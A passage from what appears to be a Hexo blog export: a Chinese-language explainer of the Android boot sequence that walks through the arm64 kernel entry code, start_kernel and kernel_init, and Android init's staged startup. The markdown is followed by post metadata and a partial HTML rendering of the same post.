U-boot\n* LK\n\n## kernel\nAndroid使用的linux kernel,当kernel启动时,会执行一系列的初始化操作,比如设置缓存,内存,加载驱动程序,挂载根文件系统,初始化输入输出等.\n当内核启动完成之后,第一件要做的事就是在系统文件中找一个“init”,作为根进程或者第一个系统进程.\n看一下linux kernel的源码,找一个arm64架构开始分析:\n\n入口在```arch/arm64/kernel/head.S```\n```S\n\n * Kernel startup entry point.\n * ---------------------------\n *\n * The requirements are:\n *   MMU = off, D-cache = off, I-cache = on or off,\n *   x0 = physical address to the FDT blob.\n *\n * Note that the callee-saved registers are used for storing variables\n * that are useful before the MMU is enabled. The allocations are described\n * in the entry routines.\n */\n\t__HEAD\n\t/*\n\t * DO NOT MODIFY. Image header expected by Linux boot-loaders.\n\t */\n\tefi_signature_nop\t\t\t// special NOP to identity as PE/COFF executable \n\tb\tprimary_entry\t\t\t// branch to kernel start, magic 开始跳转到内核入口\n\t.quad\t0\t\t\t\t// Image load offset from start of RAM, little-endian\n\tle64sym\t_kernel_size_le\t\t\t// Effective size of kernel image, little-endian\n\tle64sym\t_kernel_flags_le\t\t// Informative flags, little-endian\n\t.quad\t0\t\t\t\t// reserved\n\t.quad\t0\t\t\t\t// reserved\n\t.quad\t0\t\t\t\t// reserved\n\t.ascii\tARM64_IMAGE_MAGIC\t\t// Magic number\n\t.long\t.Lpe_header_offset\t\t// Offset to the PE header.\n\n\t__EFI_PE_HEADER\n\n\t.section \".idmap.text\",\"a\"\n\n\t/*\n\t * The following callee saved general purpose registers are used on the\n\t * primary lowlevel boot path:\n\t *\n\t *  Register   Scope                      Purpose\n\t *  x19        primary_entry() .. start_kernel()        whether we entered with the MMU on\n\t *  x20        primary_entry() .. __primary_switch()    CPU boot mode\n\t *  x21        primary_entry() .. start_kernel()        FDT pointer passed at boot in x0\n\t *  x22        create_idmap() .. start_kernel()         ID map VA of the DT blob\n\t *  x23        primary_entry() .. start_kernel()        physical misalignment/KASLR offset\n\t *  x24        __primary_switch()                       linear map KASLR seed\n\t *  x25        primary_entry() .. start_kernel()        supported VA size\n\t *  x28        create_idmap()                           callee preserved temp register\n\t */\n\nSYM_CODE_START(primary_entry) // 是代码的启动入口，这个函数负责在内核启动之前的各种配置\n\tbl\trecord_mmu_state  //记录当前 MMU 状态。它读取寄存器 SCTLR_EL1（在 EL1 模式下）或 SCTLR_EL2（在 EL2 模式下）的值，以确定 MMU、缓存等设置是否已开启。\n\tbl\tpreserve_boot_args //保存启动参数，以便后续阶段使用。\n\tbl\tcreate_idmap //创建恒等映射（identity mapping），即物理地址和虚拟地址一一对应的映射，以确保在 MMU 关闭的情况下代码可以执行。\n\n\t/*\n\t * If we entered with the MMU and caches on, clean the ID mapped part\n\t * of the primary boot code to the PoC so we can safely execute it with\n\t * the MMU off.\n\t */\n\tcbz\tx19, 0f\n\tadrp\tx0, __idmap_text_start\n\tadr_l\tx1, __idmap_text_end\n\tadr_l\tx2, dcache_clean_poc\n\tblr\tx2\n0:\tmov\tx0, x19\n\tbl\tinit_kernel_el\t\t\t// w0=cpu_boot_mode\n\tmov\tx20, x0\n\n\t/*\n\t * The following calls CPU setup code, see arch/arm64/mm/proc.S for\n\t * details.\n\t * On return, the CPU will be ready for the MMU to be turned on and\n\t * the TCR will have been set.\n\t */\n#if VA_BITS > 48\n\tmrs_s\tx0, SYS_ID_AA64MMFR2_EL1\n\ttst\tx0, ID_AA64MMFR2_EL1_VARange_MASK\n\tmov\tx0, #VA_BITS\n\tmov\tx25, #VA_BITS_MIN\n\tcsel\tx25, x25, x0, eq\n\tmov\tx0, x25\n#endif\n\tbl\t__cpu_setup\t\t\t// initialise processor\n\tb\t__primary_switch\nSYM_CODE_END(primary_entry)\n\n```\nSYM_CODE_START(primary_entry) 宏解析\n```s\n#define ASM_NL ;\n#define SYM_L_GLOBAL(name) .globl name\n\n#define SYM_CODE_START(name) \\\n\tSYM_START(name, SYM_L_GLOBAL , SYM_A_ALIGN)\n\n#define SYM_START(name, linkage, align...) \\\n\tSYM_ENTRY(name,linkage,align)\n\n#define SYM_ENTRY(name,linkage,align...) \\\n\tlinkage(name) ASM_NL \\\n\talign ASM_NL \\\n\tname:\n#解析为:\n.globl primary_entry;\n.balign 4; \nprimary_entry:\n```\n```S\nSYM_FUNC_START_LOCAL(__primary_switch)\n\t...\n\tldr\tx8, =__primary_switched\n\tadrp\tx0, KERNEL_START\t\t// __pa(KERNEL_START)\n\tbr\tx8\n\t...\nSYM_FUNC_END(__primary_switch)\n\n/*\n * The following fragment of code is executed with the MMU enabled.\n *\n *   x0 = __pa(KERNEL_START)\n */\nSYM_FUNC_START_LOCAL(__primary_switched)\n\tadr_l\tx4, init_task\n\t...\n\tmov\tx0, x20\n\tbl\tfinalise_el2\t\t\t// Prefer VHE if possible\n\tldp\tx29, x30, [sp], #16\n\tbl\tstart_kernel\n\tASM_BUG()\nSYM_FUNC_END(__primary_switched)\n```\n初始化会执行到__primary_switched,再执行start_kernel,start_kernel是内核C代码的入口\n这个时候“0号”进程“swapper”(一个Idle进程)已经启动了(init_task.c中调用).\n* 启动内核\n```c\n// 声明：inlude/linux/start_kernel.h\nextern asmlinkage void __init __noreturn start_kernel(void);\n/*\nasmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。\n\t•\t作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。\n\n在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。*/\n\n//实现：init/main.c\n\nvoid start_kernel(void){\n\t...\n\tarch_call_rest_init();\n\t...\n}\n\n\nvoid __init __weak __noreturn arch_call_rest_init(void){\n\trest_init();\n}\n/**\nrest_init 函数的职责包括：\n\n\t1.\t启动 init 进程，使其获得 PID 1。\n\t2.\t启动 kthreadd 内核线程管理进程，负责管理所有的内核线程。\n\t3.\t将系统状态设置为 SYSTEM_SCHEDULING，表明系统已经完成启动并准备好调度。\n\t4.\t最终将 CPU 置于空闲状态。\n*/\n\nnoinline void _ref __noreturn rest_init(void){\n\tint pid;\n\n\tpid = user_mode_thread(kernel_init,NULL,CLONE_FS);\n}\n/**\nuser_mode_thread 通过创建一个新的线程并切换到用户模式，完成了从内核空间向用户空间的过渡。这个过程需要配置和设置特定的寄存器、栈以及状态，以确保新线程可以在用户模式下正常运行。\n1.\tinit 进程必须是用户态进程：\n\t•\t在 Linux 系统中，init 进程（PID 1）是第一个用户态进程。所有用户态进程都是直接或间接从 init 派生的。\n\t•\tinit 进程通常负责启动用户空间的初始化脚本和守护进程，建立用户空间环境。因此，init 必须以用户态运行。\n2.\tkernel_init 的任务是启动用户空间应用：\n\t•\tkernel_init 函数的作用是完成一些内核启动后的收尾工作，然后启动用户态的 /sbin/init 或者其他指定的初始化程序，以此开始加载用户态进程和服务。\n\t•\t通过 user_mode_thread 进入用户模式执行 kernel_init，使得它可以顺利地过渡到用户空间，并启动用户态程序。\t\n3.\t安全性和隔离性：\n\t•\t将 kernel_init 放在用户模式运行可以将其与内核空间隔离。这种设计符合 Linux 内核的安全模型，使用户空间和内核空间隔离，避免了对内核资源的意外或恶意操作。\n\t•\t用户态进程的错误（如非法访问内存）不会影响到内核本身的稳定性，而是被限制在用户空间。\n4.\t切换到用户态是 Linux 启动流程的必要步骤：\n\t•\tLinux 的启动流程分为内核初始化和用户空间初始化两个主要阶段。rest_init 调用 user_mode_thread 生成一个用户态进程，这标志着内核的初始化阶段已经完成，系统从内核态过渡到用户态。\n\t•\t这一步完成后，内核将主要作为用户空间进程的支持系统，不会主动执行其他任务，除非通过系统调用、异常或中断进入内核。\n*/\n\n/**kernel_init 函数的主要目标是执行用户空间的 init 程序（通常是 /sbin/init），从而让系统进入多用户操作模式，并为用户空间进程提供运行环境。*/\nstatic int __ref kernel_init(void *unused){\n\tint ret;\n\n\t/*\n\t * Wait until kthreadd is all set-up.\n\t•\twait_for_completion 等待 kthreadd（内核线程管理进程）完成初始化，确保在内核线程管理机制准备好之前不会继续执行。\n\t•\t这是启动用户空间进程的前提条件，因为用户态的进程可能需要创建内核线程，而 kthreadd 管理所有内核线程的创建。\n\t */\n\twait_for_completion(&kthreadd_done);\n\n\t/**\n\t•\tkernel_init_freeable 负责完成一些可以在内核空间中释放的初始化任务。这些任务包括加载设备驱动程序、设置文件系统等。\n\t•\t此时系统仍处于内核态，确保内核态初始化完整后再释放内存。\n\t*/\n\tkernel_init_freeable();\n\t/* need to finish all async __init code before freeing the memory \n\t•\tasync_synchronize_full() 确保所有的异步初始化操作都已完成。\n\t•\t设置 system_state 为 SYSTEM_FREEING_INITMEM，表明系统已经准备好释放初始化用的内存。\n\t•\t调用一系列函数（如 kprobe_free_init_mem、ftrace_free_init_mem 等）释放内核初始化过程中分配的内存。\n\t•\tfree_initmem() 释放 .init 段的内存，这部分内存仅用于启动时的内核态初始化，初始化完成后便不再需要，因此可以释放。\n\t•\tmark_readonly() 将某些内核代码段设置为只读，以增强系统的安全性\n\t*/\n\tasync_synchronize_full();\n\n\tsystem_state = SYSTEM_FREEING_INITMEM;\n\tkprobe_free_init_mem();\n\tftrace_free_init_mem();\n\tkgdb_free_init_mem();\n\texit_boot_config();\n\tfree_initmem();\n\tmark_readonly();\n\n\t/*\n\t * Kernel mappings are now finalized - update the userspace page-table\n\t * to finalize PTI.\n\t */\n\tpti_finalize();\n\n\t/**\n\t•\t将系统状态设置为 SYSTEM_RUNNING，表示系统已经完成内核态的初始化，可以正常运行。\n\t•\t设置默认的 NUMA（非一致性内存访问）策略。\n\t•\t调用 rcu_end_inkernel_boot() 结束 RCU 的启动状态，进入正常的 RCU 调度状态。\n\t*/\n\tsystem_state = SYSTEM_RUNNING;\n\tnuma_default_policy();\n\n\trcu_end_inkernel_boot();\n\t/**\n\t•\tdo_sysctl_args() 解析启动时传入的系统控制参数（sysctl arguments），并应用这些参数。\n\t*/\n\tdo_sysctl_args();\n\t/**\n\t内核接下来会尝试启动 init 进程，进入用户空间，并完成从内核态到用户态的过渡。它会按顺序检查不同的命令，直到成功启动一个 init 程序。\n\t*/\n\tif (ramdisk_execute_command) {\n\t\tret = run_init_process(ramdisk_execute_command);\n\t\tif (!ret)\n\t\t\treturn 0;\n\t\tpr_err(\"Failed to execute %s (error %d)\\n\",\n\t\t       ramdisk_execute_command, ret);\n\t}\n\n\t/*\n\t * We try each of these until one succeeds.\n\t *\n\t * The Bourne shell can be used instead of init if we are\n\t * trying to recover a really broken machine.\n\t */\n\tif (execute_command) {\n\t\tret = run_init_process(execute_command);\n\t\tif (!ret)\n\t\t\treturn 0;\n\t\tpanic(\"Requested init %s failed (error %d).\",\n\t\t      execute_command, ret);\n\t}\n\n\tif (CONFIG_DEFAULT_INIT[0] != '\\0') {\n\t\tret = run_init_process(CONFIG_DEFAULT_INIT);\n\t\tif (ret)\n\t\t\tpr_err(\"Default init %s failed (error %d)\\n\",\n\t\t\t       CONFIG_DEFAULT_INIT, ret);\n\t\telse\n\t\t\treturn 0;\n\t}\n\n\tif (!try_to_run_init_process(\"/sbin/init\") ||\n\t    !try_to_run_init_process(\"/etc/init\") ||\n\t    !try_to_run_init_process(\"/bin/init\") ||\n\t    !try_to_run_init_process(\"/bin/sh\"))\n\t\treturn 0;\n\n\tpanic(\"No working init found.  Try passing init= option to kernel. \"\n\t      \"See Linux Documentation/admin-guide/init.rst for guidance.\");\n}\n内核态到用户态的过渡\n\n\t1.\t启动 init 进程：内核首先在内核态完成各项初始化工作，创建并执行 init 进程。\n\t2.\t执行用户空间的 init 程序：init 程序成功启动后，系统将从内核态过渡到用户态。此时，init 成为用户空间中第一个进程，接管系统控制权。\n\t3.\t进入用户空间：执行 execve（或类似的系统调用）将用户空间的 init 程序加载到内存中，内核清除旧的内存映射并建立用户空间的内存映射，完成从内核态到用户态的过渡。\n\t4.\t系统进入正常运行：一旦 init 进程运行，系统便进入多用户模式，可以运行用户应用程序和守护进程。\n\nkernel_init:\n\t•\tkernel_init 函数完成内核态的初始化任务并最终启动 init 进程。\n\t•\t内核通过逐步释放内存、更新系统状态等操作，为进入用户态做好准备。\n\t•\t当 init 程序启动成功，系统完成从内核态到用户态的过渡，内核初始化阶段结束，用户空间的系统管理程序正式接管控制权。\n\n```\n## init\n源码：```system/core/init/main.cpp```\n进程位置：```/system/core/init```\n\n```cpp\nint main(int argc, char** argv) {\n#if __has_feature(address_sanitizer)\n    __asan_set_error_report_callback(AsanReportCallback);\n#endif\n\n    if (!strcmp(basename(argv[0]), \"ueventd\")) {\n        return ueventd_main(argc, argv);\n    }\n\n    if (argc > 1) {\n        if (!strcmp(argv[1], \"subcontext\")) {\n            android::base::InitLogging(argv, &android::base::KernelLogger);\n            const BuiltinFunctionMap function_map;\n\n            return SubcontextMain(argc, argv, &function_map);\n        }\n\n        if (!strcmp(argv[1], \"selinux_setup\")) {\n            return SetupSelinux(argv);\n        }\n\n        if (!strcmp(argv[1], \"second_stage\")) {\n            return SecondStageMain(argc, argv);\n        }\n    }\n\n    return FirstStageMain(argc, argv);\n}\n```\nFirstStageMain\n```cpp\nint FirstStageMain(int argc, char** argv) {\n\tstd::vector<std::pair<std::string, int>> errors;\n\t#define CHECKCALL(x) \\\n    if (x != 0) errors.emplace_back(#x \" failed\", errno);\n\t/**\n\t•\t#x：# 是预处理操作符，将参数 x 转换为字符串字面量。例如，如果 x 是 open(\"/some/file\")，那么 #x 会被替换为字符串 \"open(\\\"/some/file\\\")\"。\n\t•\t#x \" failed\"：会生成类似 \"open(\\\"/some/file\\\") failed\" 的字符串，表示 x 的调用失败。\n\t•\terrno：一个全局变量，通常用来存储最近一次系统调用或库函数的错误代码。errno 的值在发生错误时会被相应函数设置成错误代码，以便诊断错误原因。\n\t*/\n    CHECKCALL(clearenv());\n    CHECKCALL(setenv(\"PATH\", _PATH_DEFPATH, 1));\n\n    const char* path = \"/system/bin/init\";\n    const char* args[] = {path, \"selinux_setup\", nullptr};\n    execv(path, const_cast<char**>(args));\n}\n```\n执行```/system/bin/init selinux_setup```\nSetupSelinux\n```cpp\nint SetupSelinux(char** argv) {\n    InitKernelLogging(argv);\n\n    if (REBOOT_BOOTLOADER_ON_PANIC) {\n        InstallRebootSignalHandlers();\n    }\n\n    // Set up SELinux, loading the SELinux policy.\n    SelinuxSetupKernelLogging();\n    SelinuxInitialize();\n\n    // We're in the kernel domain and want to transition to the init domain.  File systems that\n    // store SELabels in their xattrs, such as ext4 do not need an explicit restorecon here,\n    // but other file systems do.  In particular, this is needed for ramdisks such as the\n    // recovery image for A/B devices.\n    if (selinux_android_restorecon(\"/system/bin/init\", 0) == -1) {\n        PLOG(FATAL) << \"restorecon failed of /system/bin/init failed\";\n    }\n\n    const char* path = \"/system/bin/init\";\n    const char* args[] = {path, \"second_stage\", nullptr};\n    execv(path, const_cast<char**>(args));\n\n    // execv() only returns if an error happened, in which case we\n    // panic and never return from this function.\n    PLOG(FATAL) << \"execv(\\\"\" << path << \"\\\") failed\";\n\n    return 1;\n}\n```\n执行```/system/bin/init second_stage```\nSecondStageMain\n```cpp\n\nint SecondStageMain(int argc, char** argv) {\n\n    Epoll epoll;\n    if (auto result = epoll.Open(); !result) {\n        PLOG(FATAL) << result.error();\n    }\n\tInstallSignalFdHandler(&epoll);\n\n\t\n\tActionManager& am = ActionManager::GetInstance();\n    ServiceList& sm = ServiceList::GetInstance();\n\t//加载启动脚本\n    LoadBootScripts(am, sm);\n\n\twhile (true) {}\n}\n```\n### 一、概述\ninit进程是Linux系统中用户空间的第一个进程，进程号固定为1。Kernel启动后，在用户空间启动init进程，并调用init中的main()方法执行init进程的职责。对于init进程的功能为：\n * 挂载(mount) /sys, /dev 或者/proc等文件\n * 解析并运行所有的init.rc相关文件\n * 根据rc文件，生成相应的设备驱动节点\n * 处理子进程的终止(signal方式)\n * 提供属性服务的功能\n\n\n### 解析启动脚本\n\n```c\nstatic void LoadBootScripts(ActionManager& action_manager, ServiceList& service_list) {\n    Parser parser = CreateParser(action_manager, service_list);\n\n    std::string bootscript = GetProperty(\"ro.boot.init_rc\", \"\");\n    if (bootscript.empty()) {\n        parser.ParseConfig(\"/init.rc\");\n        if (!parser.ParseConfig(\"/system/etc/init\")) {\n            late_import_paths.emplace_back(\"/system/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/product/etc/init\")) {\n            late_import_paths.emplace_back(\"/product/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/product_services/etc/init\")) {\n            late_import_paths.emplace_back(\"/product_services/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/odm/etc/init\")) {\n            late_import_paths.emplace_back(\"/odm/etc/init\");\n        }\n        if (!parser.ParseConfig(\"/vendor/etc/init\")) {\n            late_import_paths.emplace_back(\"/vendor/etc/init\");\n        }\n    } else {\n        parser.ParseConfig(bootscript);\n    }\n}\n```\n\n\n\n\n### 启动解析的服务\n\n### 守护解析的服务\n\n### 启动java虚拟机\n\n### 预加载资源\n\n### 循环等待孵化进程\n\n### 启动SystemServer 进程\n\n### 创建SystemServer\n\n### 管理SystemServer","slug":"android_init","published":0,"date":"2024-10-13T11:27:35.256Z","updated":"2025-03-12T09:20:03.781Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risy0007v8fy3nt0ep7h","content":"<h1 id=\"Android-启动流程\"><a href=\"#Android-启动流程\" class=\"headerlink\" title=\"Android 启动流程\"></a>Android 启动流程</h1><p>idle 进程 优先级<br>生成  1 进程init<br>生成 2 进程 system_server</p>\n<p>基于android 10来分析</p>\n<h2 id=\"Boot-ROM\"><a href=\"#Boot-ROM\" class=\"headerlink\" title=\"Boot ROM\"></a>Boot ROM</h2><p>当按下电源键，硬件上电之后，会有一个固定的内存区域读取程序，这个程序是烧写到硬件上的ROM,用于将bootloader加载到RAM中，并开始执行它。</p>\n<h2 id=\"bootloader\"><a href=\"#bootloader\" class=\"headerlink\" title=\"bootloader\"></a>bootloader</h2><p>bootloader用于告诉设备如何找到系统内核，和启动内核。<br>手机厂商一般会在bootloader中加上密钥锁和一些限制.<br>bootloader执行一般分为两个阶段:</p>\n<ul>\n<li><ol>\n<li>检测外部RAM内存,并加载一段bootloader代码用于第二阶段的执行</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>设置运行内核所需要的网络和内存等<br>高通芯片提供的LK,就可以作为一个Android的bootloader.<br>常见的bootloader有:</li>\n</ol>\n</li>\n<li>U-boot</li>\n<li>LK</li>\n</ul>\n<h2 id=\"kernel\"><a href=\"#kernel\" class=\"headerlink\" title=\"kernel\"></a>kernel</h2><p>Android使用的linux kernel,当kernel启动时,会执行一系列的初始化操作,比如设置缓存,内存,加载驱动程序,挂载根文件系统,初始化输入输出等.<br>当内核启动完成之后,第一件要做的事就是在系统文件中找一个“init”,作为根进程或者第一个系统进程.<br>看一下linux kernel的源码,找一个arm64架构开始分析:</p>\n<p>入口在<code>arch/arm64/kernel/head.S</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"> * Kernel startup entry point.</span><br><span class=\"line\"> * ---------------------------</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * The requirements are:</span><br><span class=\"line\"> *   MMU = off, D-cache = off, I-cache = on or off,</span><br><span class=\"line\"> *   x0 = physical address to the FDT blob.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * Note that the callee-saved registers are used for storing variables</span><br><span class=\"line\"> * that are useful before the MMU is enabled. The allocations are described</span><br><span class=\"line\"> * in the entry routines.</span><br><span class=\"line\"> */</span><br><span class=\"line\">\t__HEAD</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * DO NOT MODIFY. Image header expected by Linux boot-loaders.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tefi_signature_nop\t\t\t// special NOP to identity as PE/COFF executable </span><br><span class=\"line\">\tb\tprimary_entry\t\t\t// branch to kernel start, magic 开始跳转到内核入口</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// Image load offset from start of RAM, little-endian</span><br><span class=\"line\">\tle64sym\t_kernel_size_le\t\t\t// Effective size of kernel image, little-endian</span><br><span class=\"line\">\tle64sym\t_kernel_flags_le\t\t// Informative flags, little-endian</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// reserved</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// reserved</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// reserved</span><br><span class=\"line\">\t.ascii\tARM64_IMAGE_MAGIC\t\t// Magic number</span><br><span class=\"line\">\t.long\t.Lpe_header_offset\t\t// Offset to the PE header.</span><br><span class=\"line\"></span><br><span class=\"line\">\t__EFI_PE_HEADER</span><br><span class=\"line\"></span><br><span class=\"line\">\t.section &quot;.idmap.text&quot;,&quot;a&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * The following callee saved general purpose registers are used on the</span><br><span class=\"line\">\t * primary lowlevel boot path:</span><br><span class=\"line\">\t *</span><br><span class=\"line\">\t *  Register   Scope                      Purpose</span><br><span class=\"line\">\t *  x19        primary_entry() .. start_kernel()        whether we entered with the MMU on</span><br><span class=\"line\">\t *  x20        primary_entry() .. __primary_switch()    CPU boot mode</span><br><span class=\"line\">\t *  x21        primary_entry() .. start_kernel()        FDT pointer passed at boot in x0</span><br><span class=\"line\">\t *  x22        create_idmap() .. start_kernel()         ID map VA of the DT blob</span><br><span class=\"line\">\t *  x23        primary_entry() .. start_kernel()        physical misalignment/KASLR offset</span><br><span class=\"line\">\t *  x24        __primary_switch()                       linear map KASLR seed</span><br><span class=\"line\">\t *  x25        primary_entry() .. start_kernel()        supported VA size</span><br><span class=\"line\">\t *  x28        create_idmap()                           callee preserved temp register</span><br><span class=\"line\">\t */</span><br><span class=\"line\"></span><br><span class=\"line\">SYM_CODE_START(primary_entry) // 是代码的启动入口，这个函数负责在内核启动之前的各种配置</span><br><span class=\"line\">\tbl\trecord_mmu_state  //记录当前 MMU 状态。它读取寄存器 SCTLR_EL1（在 EL1 模式下）或 SCTLR_EL2（在 EL2 模式下）的值，以确定 MMU、缓存等设置是否已开启。</span><br><span class=\"line\">\tbl\tpreserve_boot_args //保存启动参数，以便后续阶段使用。</span><br><span class=\"line\">\tbl\tcreate_idmap //创建恒等映射（identity mapping），即物理地址和虚拟地址一一对应的映射，以确保在 MMU 关闭的情况下代码可以执行。</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * If we entered with the MMU and caches on, clean the ID mapped part</span><br><span class=\"line\">\t * of the primary boot code to the PoC so we can safely execute it with</span><br><span class=\"line\">\t * the MMU off.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tcbz\tx19, 0f</span><br><span class=\"line\">\tadrp\tx0, __idmap_text_start</span><br><span class=\"line\">\tadr_l\tx1, __idmap_text_end</span><br><span class=\"line\">\tadr_l\tx2, dcache_clean_poc</span><br><span class=\"line\">\tblr\tx2</span><br><span class=\"line\">0:\tmov\tx0, x19</span><br><span class=\"line\">\tbl\tinit_kernel_el\t\t\t// w0=cpu_boot_mode</span><br><span class=\"line\">\tmov\tx20, x0</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * The following calls CPU setup code, see arch/arm64/mm/proc.S for</span><br><span class=\"line\">\t * details.</span><br><span class=\"line\">\t * On return, the CPU will be ready for the MMU to be turned on and</span><br><span class=\"line\">\t * the TCR will have been set.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">#if VA_BITS &gt; 48</span><br><span class=\"line\">\tmrs_s\tx0, SYS_ID_AA64MMFR2_EL1</span><br><span class=\"line\">\ttst\tx0, ID_AA64MMFR2_EL1_VARange_MASK</span><br><span class=\"line\">\tmov\tx0, #VA_BITS</span><br><span class=\"line\">\tmov\tx25, #VA_BITS_MIN</span><br><span class=\"line\">\tcsel\tx25, x25, x0, eq</span><br><span class=\"line\">\tmov\tx0, x25</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\tbl\t__cpu_setup\t\t\t// initialise processor</span><br><span class=\"line\">\tb\t__primary_switch</span><br><span class=\"line\">SYM_CODE_END(primary_entry)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>SYM_CODE_START(primary_entry) 宏解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define ASM_NL ;</span><br><span class=\"line\">#define SYM_L_GLOBAL(name) .globl name</span><br><span class=\"line\"></span><br><span class=\"line\">#define SYM_CODE_START(name) \\</span><br><span class=\"line\">\tSYM_START(name, SYM_L_GLOBAL , SYM_A_ALIGN)</span><br><span class=\"line\"></span><br><span class=\"line\">#define SYM_START(name, linkage, align...) \\</span><br><span class=\"line\">\tSYM_ENTRY(name,linkage,align)</span><br><span class=\"line\"></span><br><span class=\"line\">#define SYM_ENTRY(name,linkage,align...) \\</span><br><span class=\"line\">\tlinkage(name) ASM_NL \\</span><br><span class=\"line\">\talign ASM_NL \\</span><br><span class=\"line\">\tname:</span><br><span class=\"line\">#解析为:</span><br><span class=\"line\">.globl primary_entry;</span><br><span class=\"line\">.balign 4; </span><br><span class=\"line\">primary_entry:</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SYM_FUNC_START_LOCAL(__primary_switch)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tldr\tx8, =__primary_switched</span><br><span class=\"line\">\tadrp\tx0, KERNEL_START\t\t// __pa(KERNEL_START)</span><br><span class=\"line\">\tbr\tx8</span><br><span class=\"line\">\t...</span><br><span class=\"line\">SYM_FUNC_END(__primary_switch)</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"> * The following fragment of code is executed with the MMU enabled.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *   x0 = __pa(KERNEL_START)</span><br><span class=\"line\"> */</span><br><span class=\"line\">SYM_FUNC_START_LOCAL(__primary_switched)</span><br><span 